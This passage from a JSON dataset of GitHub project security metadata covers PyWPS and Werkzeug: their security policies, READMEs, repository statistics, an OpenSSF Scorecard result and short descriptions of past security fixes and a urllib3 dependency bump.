        "SecurityPolicy_content": "# PyWPS Security Policy\n\n## Reporting\n\nSecurity/vulnerability reports **should not** be submitted through GitHub issues or public discussions, but instead please send your report \nto **geopython-security nospam @ lists.osgeo.org** - (remove the blanks and 'nospam').  \n\n## Supported Versions\n\nThe PyWPS Project Steering Committee will release patches for security vulnerabilities for the following versions:\n\n| Version | Supported          |\n|---------|--------------------|\n| 4.5.x   | :white_check_mark: |\n| 4.4.x   | :white_check_mark: |\n| < 4.4   | previous versions  |\n",
        "project_all_labels": [
            "bug",
            "documentation",
            "duplicate",
            "enhancement",
            "invalid",
            "OSGeo Incubation",
            "packaging",
            "question",
            "wontfix"
        ],
        "README_content": "# PyWPS\n\nPyWPS is an implementation of the Web Processing Service standard from\nthe Open Geospatial Consortium. PyWPS is written in Python.\n\n[![Documentation Status](https://img.shields.io/badge/docs-latest-brightgreen.svg)](https://pywps.readthedocs.io/en/latest/?badge=latest)\n[![Build Status](https://travis-ci.org/geopython/pywps.png)](https://travis-ci.org/geopython/pywps)\n[![Codacy Badge](https://api.codacy.com/project/badge/Grade/19d53c45a3854e37b89523cf9bb1d262)](https://www.codacy.com/project/cehbrecht/pywps/dashboard?utm_source=github.com&amp;utm_medium=referral&amp;utm_content=geopython/pywps&amp;utm_campaign=Badge_Grade_Dashboard)\n[![Coverage Status](https://coveralls.io/repos/github/geopython/pywps/badge.svg?branch=master)](https://coveralls.io/github/geopython/pywps?branch=master)\n[![PyPI](https://img.shields.io/pypi/dm/pywps.svg)]()\n[![GitHub license](https://img.shields.io/github/license/geopython/pywps.svg)]()\n\n[![Join the chat at https://gitter.im/geopython/pywps](https://badges.gitter.im/geopython/pywps.svg)](https://gitter.im/geopython/pywps?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n\n# License\n\nAs of PyWPS 4.0.0, PyWPS is released under an\n[MIT](https://en.wikipedia.org/wiki/MIT_License) license\n(see [LICENSE.txt](LICENSE.txt)).\n\n# Dependencies\n\nSee [requirements.txt](requirements.txt) file\n\n# Run tests\n\n```bash\npip install -r requirements-dev.txt\n# run unit tests\npython -m unittest tests\n# run code coverage\npython -m coverage run --source=pywps -m unittest tests\npython -m coverage report -m\n```\n\n# Run web application\n\n## Example service\n\nClone the example service after having installed PyWPS:\n\n```bash\ngit clone git://github.com/geopython/pywps-flask.git pywps-flask\ncd pywps-flask\npython demo.py\n```\n\n## Apache configuration\n\n1. Enable WSGI extension\n\n2. Add configuration:\n\n    ```apache\n    WSGIDaemonProcess pywps user=user group=group processes=2 threads=5\n    WSGIScriptAlias /pywps /path/to/www/htdocs/wps/pywps.wsgi\n\n    <Directory /path/to/www/htdocs/wps/>\n        WSGIProcessGroup group\n        WSGIApplicationGroup %{GLOBAL}\n        Order deny,allow\n        Allow from all\n    </Directory>\n    ```\n\n3. Create wsgi file:\n\n    ```python\n    #!/usr/bin/env python3\n    import sys\n    sys.path.append('/path/to/src/pywps/')\n\n    import pywps\n    from pywps.app import Service, WPS, Process\n\n    def pr1():\n        \"\"\"This is the execute method of the process\n        \"\"\"\n        pass\n\n\n    application = Service(processes=[Process(pr1)])\n    ```\n\n4. Run via web browser\n\n    `http://localhost/pywps/?service=WPS&request=GetCapabilities&version=1.0.0`\n\n5. Run in command line:\n\n    ```bash\n    curl 'http://localhost/pywps/?service=WPS&request=GetCapabilities&version=1.0.0'\n    ```\n\n\n# Issues\n\nOn Windows PyWPS does not support multiprocessing which is used when making\nrequests storing the response document and updating the status to displaying\nto the user the progression of a process.\n",
        "num_commits": 2236,
        "project_age_days": 4508,
        "project_created_at": "2012-06-26",
        "latest_updated_at": "2024-10-18",
        "latest_pushed_at": "2024-02-09",
        "num_contributors": 44,
        "num_pull": 398,
        "num_issues": 692,
        "num_opening_issue": 84,
        "project_size(kB)": 14545,
        "num_stargazers": 176,
        "num_watchers": 176,
        "num_forks": 117,
        "num_subscribers": 21,
        "SecurityPolicy_created_at": "2021-08-13 20:09:05",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "58970c9348c8747e7410cfe67b9558f77dc17b3c",
                "url": "https://github.com/geopython/pywps/commit/58970c9348c8747e7410cfe67b9558f77dc17b3c",
                "date": "2023-07-07 14:03:55"
            },
            {
                "commit_id": "9d1ba7f1e78f49b7f75a4af7152b7a7a847c37b3",
                "url": "https://github.com/geopython/pywps/commit/9d1ba7f1e78f49b7f75a4af7152b7a7a847c37b3",
                "date": "2021-09-21 10:34:54"
            },
            {
                "commit_id": "c40c496af54a8f1710db57d1acb70e412a8bcf21",
                "url": "https://github.com/geopython/pywps/commit/c40c496af54a8f1710db57d1acb70e412a8bcf21",
                "date": "2021-08-16 12:20:13"
            },
            {
                "commit_id": "d014c9c90c2ff9052ec70ca74894152ca2691651",
                "url": "https://github.com/geopython/pywps/commit/d014c9c90c2ff9052ec70ca74894152ca2691651",
                "date": "2021-08-13 20:09:05"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "email",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Reporting mechanism",
            "Scope of practice"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "pallets/werkzeug",
        "project_url": "https://github.com/pallets/werkzeug",
        "SSF": {
            "date": "2024-10-29T19:21:04+07:00",
            "repo": {
                "name": "github.com/pallets/werkzeug",
                "commit": "7e22812f390df94809b01c93f6849901e1be0de4"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.7,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'main'",
                        "Info: 'force pushes' disabled on branch 'main'",
                        "Warn: 'branch protection settings apply to administrators' is disable on branch 'main'",
                        "Warn: could not determine whether codeowners review is allowed",
                        "Warn: no status checks found to merge onto branch 'main'",
                        "Warn: PRs are not required to make changes on branch 'main'; or we don't have data to detect it.If you think it might be the latter, make sure to run Scorecard with a PAT or use Repo Rules (that are always public) instead of Branch Protection settings"
                    ],
                    "score": 3,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "8 out of 8 merged PRs checked by a CI test -- score normalized to 10",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 1,
                    "reason": "Found 2/19 approved changesets -- score normalized to 1",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: nsupdate-info contributor org/company found, IIC2233-2016-1 contributor org/company found, remotestorage contributor org/company found, muffins-on-dope contributor org/company found, MLH-Fellowship contributor org/company found, pimutils contributor org/company found, PyCQA contributor org/company found, PyO3 contributor org/company found, IIC2113-2018-2 contributor org/company found, homeworkprod-forks contributor org/company found, autoinvent contributor org/company found, borgbackup contributor org/company found, UnicornConf contributor org/company found, ermine-language contributor org/company found, pre-commit contributor org/company found, pre-commit-ci contributor org/company found, FlaskCon contributor org/company found, mozilla contributor org/company found, recursecenter contributor org/company found, sabal contributor org/company found, yeoman contributor org/company found, actix contributor org/company found, sphinx-contrib contributor org/company found, deadsnakes contributor org/company found, Bash-it contributor org/company found, python-babel contributor org/company found, mailme contributor org/company found, conda-forge contributor org/company found, discorporate contributor org/company found, shellcheck-py contributor org/company found, sphinx-doc contributor org/company found, joindin contributor org/company found, authlib contributor org/company found, moinwiki contributor org/company found, Remotes contributor org/company found, meta contributor org/company found, click-contrib contributor org/company found, flaskcwg contributor org/company found, cern / @indico contributor org/company found, NixOS contributor org/company found, lanresort contributor org/company found, redhatinsights contributor org/company found, mlz-ictrl contributor org/company found, pygments contributor org/company found, orgatalk contributor org/company found, domain51 contributor org/company found, deprecate contributor org/company found, baznex contributor org/company found, getsentry contributor org/company found, austrianredcross contributor org/company found, namespace-uk contributor org/company found, stadthack contributor org/company found, open-source-uc contributor org/company found, sopython contributor org/company found, BirdOrgUKLearn contributor org/company found, IIC2513-2017-1 contributor org/company found, byceps contributor org/company found, iron contributor org/company found, jazzband contributor org/company found, IIC2233-2015-2 contributor org/company found, pocoo contributor org/company found, SampleEnvironment contributor org/company found, keybar contributor org/company found, facebookincubator contributor org/company found, iic2154-uc-cl contributor org/company found, holy quintet contributor org/company found, btb-royals contributor org/company found, sass contributor org/company found, pallets contributor org/company found, aheui contributor org/company found, webcomponents contributor org/company found, IIC2233-2015-1 contributor org/company found, IIC2113 contributor org/company found, snoplus contributor org/company found, python-http contributor org/company found, hsiaoming contributor org/company found, sailoboats contributor org/company found, tooling contributor org/company found, PUC-HAIVis contributor org/company found, superhuman contributor org/company found, asottile-archive contributor org/company found, northcon contributor org/company found, rust-lang-nursery contributor org/company found, sentry contributor org/company found, sabre-io contributor org/company found, GameSurge contributor org/company found, python contributor org/company found, python-hyper contributor org/company found, python-trio contributor org/company found, anthonywritescode contributor org/company found, pallets-eco contributor org/company found, indico contributor org/company found, IIC2233-2016-02 contributor org/company found, IIC2233 contributor org/company found, phagetech-ai contributor org/company found, projectpier contributor org/company found, zalando se contributor org/company found, cn contributor org/company found, IIC2513 contributor org/company found, strawberry-graphql contributor org/company found, pypy contributor org/company found, fz jülich contributor org/company found, tastejs contributor org/company found, taptapship contributor org/company found, urllib3 contributor org/company found, php-vegas contributor org/company found, scalaz contributor org/company found, wtforms contributor org/company found, pytest-dev contributor org/company found, CERN contributor org/company found, facebook contributor org/company found, woofwoofinc contributor org/company found, tango-controls contributor org/company found, mlz-cisx contributor org/company found, inyokaproject contributor org/company found, recipi contributor org/company found, tractian contributor org/company found, ethercat-rs contributor org/company found, texas contributor org/company found, rocketDuck contributor org/company found, typlog contributor org/company found, shackspace contributor org/company found, GitHub-Stars contributor org/company found, LANparties contributor org/company found, lektor contributor org/company found, unhosted contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 126 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "no dangerous workflow patterns detected",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Info: detected update tool: Dependabot: :0"
                    ],
                    "score": 10,
                    "reason": "update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE.txt:0",
                        "Info: FSF or OSI recognized license: BSD 3-Clause \"New\" or \"Revised\" License: LICENSE.txt:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 14 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Info: Project packages its releases by way of GitHub Actions.: .github/workflows/publish.yaml:55"
                    ],
                    "score": 10,
                    "reason": "packaging workflow detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": [
                        "Info: Possibly incomplete results: error parsing shell code: invalid parameter name: .github/workflows/tests.yaml:33",
                        "Warn: pipCommand not pinned by hash: .devcontainer/on-create-command.sh:5",
                        "Warn: pipCommand not pinned by hash: .devcontainer/on-create-command.sh:6",
                        "Warn: pipCommand not pinned by hash: .github/workflows/publish.yaml:19",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yaml:49",
                        "Warn: pipCommand not pinned by hash: .github/workflows/tests.yaml:33",
                        "Info:  12 out of  12 GitHub-owned GitHubAction dependencies pinned",
                        "Info:   5 out of   5 third-party GitHubAction dependencies pinned",
                        "Info:   0 out of   5 pipCommand dependencies pinned"
                    ],
                    "score": 5,
                    "reason": "dependency not pinned by hash detected -- score normalized to 5",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 19 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: github.com/pallets/.github/SECURITY.md:1",
                        "Info: Found linked content: github.com/pallets/.github/SECURITY.md:1",
                        "Warn: One or no descriptive hints of disclosure, vulnerability, and/or timelines in security policy",
                        "Info: Found text in security policy: github.com/pallets/.github/SECURITY.md:1"
                    ],
                    "score": 9,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": [
                        "Info: provenance for release artifact: multiple.intoto.jsonl: https://api.github.com/repos/pallets/werkzeug/releases/assets/201766315",
                        "Info: provenance for release artifact: multiple.intoto.jsonl: https://api.github.com/repos/pallets/werkzeug/releases/assets/201582813",
                        "Info: provenance for release artifact: multiple.intoto.jsonl: https://api.github.com/repos/pallets/werkzeug/releases/assets/187469492",
                        "Info: provenance for release artifact: multiple.intoto.jsonl: https://api.github.com/repos/pallets/werkzeug/releases/assets/166163666",
                        "Info: provenance for release artifact: multiple.intoto.jsonl: https://api.github.com/repos/pallets/werkzeug/releases/assets/159738024"
                    ],
                    "score": 10,
                    "reason": "5 out of the last 5 releases have a total of 5 signed artifacts.",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": [
                        "Info: jobLevel 'actions' permission set to 'read': .github/workflows/publish.yaml:32",
                        "Warn: no topLevel permission defined: .github/workflows/pre-commit.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/publish.yaml:1",
                        "Warn: no topLevel permission defined: .github/workflows/tests.yaml:1",
                        "Info: no jobLevel write permissions found"
                    ],
                    "score": 0,
                    "reason": "detected GitHub workflow tokens with excessive permissions",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/pallets/.github/contents/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\nAll Pallets projects share the same security policy. See\nhttps://palletsprojects.com/security, the canonical location for the policy,\nwhich this is copied from.\n\n## Before Reporting\n\nThere are some things we generally do not consider security issues, which can be\nfound at the canonical policy page: https://palletsprojects.com/security. Please\nreview the list before reporting an issue. You may still err on the side of\ncaution and make a private report first, but we may close it or ask you to\nreport a regular issue instead.\n\n## Reporting a Security Issue\n\nIf you believe you have identified a security issue with a Pallets or\nPallets-Eco project, **do not open a public issue**. To responsibly report a\nsecurity issue, use GitHub's [security advisory system][gh-docs]. From the\nproject's repository, click \"Security\" at the top, then click \"Advisories\" at\nthe left, then click the green \"New draft security advisory\" button.\nAlternatively, you may email [security@palletsprojects.com](mailto:security@palletsprojects.com),\nand we will convert that to a GitHub security advisory.\n\nBe sure to include as much detail as necessary in your report. As with reporting\nnormal issues, a minimal reproducible example will help the maintainers address\nthe issue faster. Information about why the issue is a security issue is also\nhelpful. If you are able, you may also provide a fix for the issue.\n\nA maintainer will reply acknowledging the report and how to continue. We will\nobtain a CVE id as well, please do not do this on your own. We will work with\nyou to attempt to understand the issue and decide on its validity. Maintainers\nare volunteers working in their free time, and therefore cannot guarantee any\nspecific timeline. Please be patient during this process.\n\nThe current feature release will receive security fixes. A backport to the\nprevious feature branch may be considered upon request based on usage information\nand severity, but is not guaranteed.\n\n[gh-docs]: https://docs.github.com/en/code-security/security-advisories/working-with-repository-security-advisories/creating-a-repository-security-advisory\n",
        "project_all_labels": [
            "ASGI",
            "bug",
            "debugger",
            "dependencies",
            "docs",
            "github_actions",
            "good first issue",
            "infrastructure",
            "python",
            "reloader",
            "routing",
            "save-for-sprint",
            "security",
            "server",
            "standards",
            "typing",
            "user-agent"
        ],
        "README_content": "# Werkzeug\n\n*werkzeug* German noun: \"tool\". Etymology: *werk* (\"work\"), *zeug* (\"stuff\")\n\nWerkzeug is a comprehensive [WSGI][] web application library. It began as\na simple collection of various utilities for WSGI applications and has\nbecome one of the most advanced WSGI utility libraries.\n\nIt includes:\n\n-   An interactive debugger that allows inspecting stack traces and\n    source code in the browser with an interactive interpreter for any\n    frame in the stack.\n-   A full-featured request object with objects to interact with\n    headers, query args, form data, files, and cookies.\n-   A response object that can wrap other WSGI applications and handle\n    streaming data.\n-   A routing system for matching URLs to endpoints and generating URLs\n    for endpoints, with an extensible system for capturing variables\n    from URLs.\n-   HTTP utilities to handle entity tags, cache control, dates, user\n    agents, cookies, files, and more.\n-   A threaded WSGI server for use while developing applications\n    locally.\n-   A test client for simulating HTTP requests during testing without\n    requiring running a server.\n\nWerkzeug doesn't enforce any dependencies. It is up to the developer to\nchoose a template engine, database adapter, and even how to handle\nrequests. It can be used to build all sorts of end user applications\nsuch as blogs, wikis, or bulletin boards.\n\n[Flask][] wraps Werkzeug, using it to handle the details of WSGI while\nproviding more structure and patterns for defining powerful\napplications.\n\n[WSGI]: https://wsgi.readthedocs.io/en/latest/\n[Flask]: https://www.palletsprojects.com/p/flask/\n\n\n## A Simple Example\n\n```python\n# save this as app.py\nfrom werkzeug.wrappers import Request, Response\n\n@Request.application\ndef application(request: Request) -> Response:\n    return Response(\"Hello, World!\")\n\nif __name__ == \"__main__\":\n    from werkzeug.serving import run_simple\n    run_simple(\"127.0.0.1\", 5000, application)\n```\n\n```\n$ python -m app\n  * Running on http://127.0.0.1:5000/ (Press CTRL+C to quit)\n```\n\n\n## Donate\n\nThe Pallets organization develops and supports Werkzeug and other\npopular packages. In order to grow the community of contributors and\nusers, and allow the maintainers to devote more time to the projects,\n[please donate today][].\n\n[please donate today]: https://palletsprojects.com/donate\n",
        "num_commits": 5695,
        "project_age_days": 5125,
        "project_created_at": "2010-10-18",
        "latest_updated_at": "2024-10-30",
        "latest_pushed_at": "2024-10-30",
        "num_contributors": 411,
        "num_pull": 1751,
        "num_issues": 2942,
        "num_opening_issue": 2,
        "project_size(kB)": 15797,
        "num_stargazers": 6652,
        "num_watchers": 6652,
        "num_forks": 1732,
        "num_subscribers": 223,
        "SecurityPolicy_created_at": "2019-07-16 21:34:14",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "76200e597624be9a44d07b20734c926d8c5d9665",
                "url": "https://github.com/pallets/.github/commit/76200e597624be9a44d07b20734c926d8c5d9665",
                "date": "2024-09-10 15:42:38"
            },
            {
                "commit_id": "74eacff3189b7efb3bc0aaddc2333b622c19bf84",
                "url": "https://github.com/pallets/.github/commit/74eacff3189b7efb3bc0aaddc2333b622c19bf84",
                "date": "2024-04-22 18:52:39"
            },
            {
                "commit_id": "ad755c68b2f120edaba5dedef1f9299706fb8e10",
                "url": "https://github.com/pallets/.github/commit/ad755c68b2f120edaba5dedef1f9299706fb8e10",
                "date": "2019-07-16 21:34:14"
            }
        ],
        "project_security_labels": [
            "security"
        ],
        "security_issues": [
            {
                "url": "https://github.com/pallets/werkzeug/pull/2350",
                "title": "routing match includes newline",
                "labels": [
                    "security"
                ],
                "user": "davidism",
                "issue_author_association": "MEMBER",
                "number": 2350,
                "id": 1171123067,
                "state": "closed",
                "project_created_at": "2022-03-16T14:44:44Z",
                "closed_at": "2022-03-16T14:46:26Z",
                "body": "The `$` in regular expressions will match *before and after* a newline character. WSGI requires the server to decode `PATH_INFO`, which can result in a requested URL `/hello%0a` looking like `/hello\\n` to the application. If you have some middleware that intercepts `/hello`, depending on how it does that, this could result in the application handling the URL instead.\r\n\r\nUse `\\Z` instead of `$` to match only the true end of the string.",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pallets/werkzeug/pulls/2350",
                    "merged_at": "2022-03-16T14:46:26Z"
                }
            },
            {
                "url": "https://github.com/pallets/werkzeug/pull/2349",
                "title": "`safe_join` keeps `directory=\"\"` as relative path",
                "labels": [
                    "security"
                ],
                "user": "davidism",
                "issue_author_association": "MEMBER",
                "number": 2349,
                "id": 1170302532,
                "state": "closed",
                "project_created_at": "2022-03-15T21:51:04Z",
                "closed_at": "2022-03-15T22:01:34Z",
                "body": "When using `send_from_directory`, which uses `safe_join`, if `directory=\"\"` is given, it was discarded and the first untrusted path component could become the first component if it was a Windows drive-relative path.",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/pallets/werkzeug/pulls/2349",
                    "merged_at": "2022-03-15T22:01:34Z"
                }
            },
            {
                "url": "https://github.com/pallets/werkzeug/pull/2080",
                "title": "[Security] Bump urllib3 from 1.26.3 to 1.26.4",
                "labels": [
                    "dependencies",
                    "security"
                ],
                "user": "dependabot-preview[bot]",
                "issue_author_association": "CONTRIBUTOR",
                "number": 2080,
                "id": 851676192,
                "state": "closed",
                "project_created_at": "2021-04-06T18:01:45Z",
                "closed_at": "2021-04-06T18:03:38Z",
                "body": "Bumps [urllib3](https://github.com/urllib3/urllib3) from 1.26.3 to 1.26.4. **This update includes a security fix.**\n<details>\n<summary>Vulnerabilities fixed</summary>\n<p><em>Sourced from <a href=\"https://github.com/advisories/GHSA-5phf-pp7p-vc2r\">The GitHub Security Advisory Database</a>.</em></p>\n<blockquote>\n<p><strong>Using default SSLContext for HTTPS requests in an HTTPS proxy doesn't verify certificate hostname for proxy connection</strong></p>\n<h3>Impact</h3>\n<p>Users who are using an HTTPS proxy to issue HTTPS requests and haven't configured their own SSLContext via <code>proxy_config</code>.\nOnly the default SSLContext is impacted.</p>\n<h3>Patches</h3>\n<p><a href=\"https://github.com/urllib3/urllib3/releases/tag/1.26.4\">urllib3 &gt;=1.26.4 has the issue resolved</a>. urllib3&lt;1.26 is not impacted due to not supporting HTTPS requests via HTTPS proxies.</p>\n<h3>Workarounds</h3>\n<p>Upgrading is recommended as this is a minor release and not likely to break current usage.</p>\n<p>Configuring an <code>SSLContext</code> with <code>check_hostname=True</code> and passing via <code>proxy_config</code> instead of relying on the default <code>SSLContext</code></p>\n<h3>For more information</h3>\n<p>If you have any questions or comments about this advisory:</p>\n<ul>\n<li>Email us at <a href=\"mailto:sethmichaellarson@gmail.com\">sethmichaellarson@gmail.com</a></li>\n</ul>\n<p>Affected versions: &gt;= 1.26.0, &lt;= 1.26.3</p>\n</blockquote>\n</details>\n<details>\n<summary>Release notes</summary>\n<p><em>Sourced from <a href=\"https://github.com/urllib3/urllib3/releases\">urllib3's releases</a>.</em></p>\n<blockquote>\n<h2>1.26.4</h2>\n<p>:warning: <strong>IMPORTANT: urllib3 v2.0 will drop support for Python 2</strong>: <a href=\"https://urllib3.readthedocs.io/en/latest/v2-roadmap.html\">Read more in the v2.0 Roadmap</a></p>\n<ul>\n<li>Changed behavior of the default <code>SSLContext</code> when connecting to HTTPS proxy during HTTPS requests. The default <code>SSLContext</code> now sets <code>check_hostname=True</code>.</li>\n</ul>\n<p><strong>If you or your organization rely on urllib3 consider supporting us via <a href=\"https://github.com/sponsors/urllib3\">GitHub Sponsors</a></strong></p>\n</blockquote>\n</details>\n<details>\n<summary>Changelog</summary>\n<p><em>Sourced from <a href=\"https://github.com/urllib3/urllib3/blob/main/CHANGES.rst\">urllib3's changelog</a>.</em></p>\n<blockquote>\n<h1>1.26.4 (2021-03-15)</h1>\n<ul>\n<li>Changed behavior of the default <code>SSLContext</code> when connecting to HTTPS proxy during HTTPS requests. The default <code>SSLContext</code> now sets <code>check_hostname=True</code>.</li>\n</ul>\n</blockquote>\n</details>\n<details>\n<summary>Commits</summary>\n<ul>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/a8913042b676c510e94fc2b097f6b514ae11a537\"><code>a891304</code></a> Release 1.26.4</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/8d65ea1ecf6e2cdc27d42124e587c1b83a3118b0\"><code>8d65ea1</code></a> Merge pull request from GHSA-5phf-pp7p-vc2r</li>\n<li><a href=\"https://github.com/urllib3/urllib3/commit/5e3432646ad63749ff0d655c157fe293cdc6c2aa\"><code>5e34326</code></a> Add proper stacklevel to method_allowlist warning</li>\n<li>See full diff in <a href=\"https://github.com/urllib3/urllib3/compare/1.26.3...1.26.4\">compare view</a></li>\n</ul>\n</details>\n<br />\n\n\n[![Dependabot compatibility score](https://api.dependabot.com/badges/compatibility_score?dependency-name=urllib3&package-manager=pip&previous-version=1.26.3&new-version=1.26.4)](https://dependabot.com/compatibility-score/?dependency-name=urllib3&package-manager=pip&previous-version=1.26.3&new-version=1.26.4)\n\nDependabot will resolve any conflicts with this PR as long as you don't alter it yourself. You can also trigger a rebase manually by commenting `@dependabot rebase`.\n\n[//]: # (dependabot-automerge-start)\nIf all status checks pass Dependabot will automatically merge this pull request.\n\n[//]: # (dependabot-automerge-end)\n\n---\n\n<details>\n<summary>Dependabot commands and options</summary>\n<br />\n\nYou can trigger Dependabot actions by commenting on this PR:\n- `@dependabot rebase` will rebase this PR\n- `@dependabot recreate` will recreate this PR, overwriting any edits that have been made to it\n- `@dependabot merge` will merge this PR after your CI passes on it\n- `@dependabot squash and merge` will squash and merge this PR after your CI passes on it\n- `@dependabot cancel merge` will cancel a previously requested merge and block automerging\n- `@dependabot reopen` will reopen this PR if it is closed\n- `@dependabot close` will close this PR and stop Dependabot recreating it. You can achieve the same result by closing it manually\n- `@dependabot ignore this major version` will close this PR and stop Dependabot creating any more for this major version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this minor version` will close this PR and stop Dependabot creating any more for this minor version (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot ignore this dependency` will close this PR and stop Dependabot creating any more for this dependency (unless you reopen the PR or upgrade to it yourself)\n- `@dependabot use these labels` will set the current labels as the default for future PRs for this repo and language\n- `@dependabot use these reviewers` will set the current reviewers as the default for future PRs for this repo and language\n- 